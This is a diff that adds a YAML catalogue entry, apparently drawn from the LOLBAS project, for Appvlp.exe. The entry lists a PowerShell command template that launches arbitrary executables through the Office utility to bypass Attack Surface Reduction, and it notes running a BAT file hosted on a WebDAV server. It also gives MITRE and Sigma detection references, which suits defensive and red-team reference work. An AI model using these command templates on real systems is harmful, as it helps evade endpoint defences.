@@ -1,0 +1,98 @@
+id: lolbas/T3RoZXJNU0JpbmFyaWVzL0FwcHZscC55bWw/RXhlY3V0ZQ/1
+type: binary
+platform: windows
+name: Appvlp.exe
+phases:
+- execution
+capabilities:
+- command-execution
+privilege_required: user
+sources:
+- project: LOLBAS
+  upstream_url: https://lolbas-project.github.io
+  license: GPL-3.0
+  upstream_version: 2056cb7662509dc998fc6ce79636aec4e6c0397f
+  last_synced: '2026-11-13'
+attack_techniques:
+- T1218
+opsec:
+  noise: high
+  detection_refs:
+  - https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_appvlp.yml
+commands:
+- template: AppVLP.exe powershell.exe -c "$e=New-Object -ComObject shell.application;$e.ShellExecute('{PATH:.exe}','',
+    '', 'open', 1)"
+  comment: Executes powershell.exe as a subprocess of AppVLP.exe and run the respective PS command.
+references:
+- https://lolbas-project.github.io/lolbas/OtherMSBinaries/Appvlp/
+tags:
+- windows
+- lolbas
+source_data:
+  LOLBAS:
+    raw:
+      name: Appvlp.exe
+      category: Execute
+      privileges: User
+      mitre_id: T1218
+      source_file: OtherMSBinaries/Appvlp.yml
+      command_source_index: 1
+      document_utf8: "---\nName: Appvlp.exe\nDescription: Application Virtualization Utility Included\
+        \ with Microsoft Office 2016\nAuthor: Oddvar Moe\nCreated: 2018-05-25\nCommands:\n  - Command:\
+        \ AppVLP.exe {PATH_SMB:.bat}\n    Usecase: Execution of BAT file hosted on Webdav server.\n  \
+        \  Description: Executes .bat file through AppVLP.exe\n    Category: Execute\n    Privileges:\
+        \ User\n    MitreID: T1218\n    OperatingSystem: Windows 10 w/Office 2016\n    Tags:\n      -\
+        \ Execute: CMD\n  - Command: AppVLP.exe powershell.exe -c \"$e=New-Object -ComObject shell.application;$e.ShellExecute('{PATH:.exe}','',\
+        \ '', 'open', 1)\"\n    Usecase: Local execution of process bypassing Attack Surface Reduction\
+        \ (ASR).\n    Description: Executes powershell.exe as a subprocess of AppVLP.exe and run the respective\
+        \ PS command.\n    Category: Execute\n    Privileges: User\n    MitreID: T1218\n    OperatingSystem:\
+        \ Windows 10 w/Office 2016\n    Tags:\n      - Execute: EXE\nFull_Path:\n  - Path: C:\\Program\
+        \ Files\\Microsoft Office\\root\\client\\appvlp.exe\n  - Path: C:\\Program Files (x86)\\Microsoft\
+        \ Office\\root\\client\\appvlp.exe\nDetection:\n  - Sigma: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_appvlp.yml\n\
+        Resources:\n  - Link: https://github.com/MoooKitty/Code-Execution\n  - Link: https://twitter.com/moo_hax/status/892388990686347264\n\
+        \  - Link: https://enigma0x3.net/2018/06/11/the-tale-of-settingcontent-ms-files/\n  - Link: https://securityboulevard.com/2018/07/attackers-test-new-document-attack-vector-that-slips-past-office-defenses/\n\
+        Acknowledgement:\n  - Person: fab\n    Handle: '@0rbz_'\n  - Person: Will\n    Handle: '@moo_hax'\n\
+        \  - Person: Matt Wilson\n    Handle: '@enigma0x3'\n"
+      document_sha256: sha256:4d5c4da6139ee3afafcdcf8a5e5b3afcd6acf9162c5e0146d0d65fae8acfde8c
+    upstream_url: https://lolbas-project.github.io/lolbas/OtherMSBinaries/Appvlp/
+    upstream_version: 2056cb7662509dc998fc6ce79636aec4e6c0397f
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: command-execution
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  phases:
+  - value: execution
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  attack_techniques:
+  - value: T1218
+    provenance:
+      type: upstream
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  privilege_required:
+    value: user
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    LOLBAS: sha256:5ab40b6d68e45d53578cee2af2f6cc412fbe2ef4a6348a6659c8803e2933094b
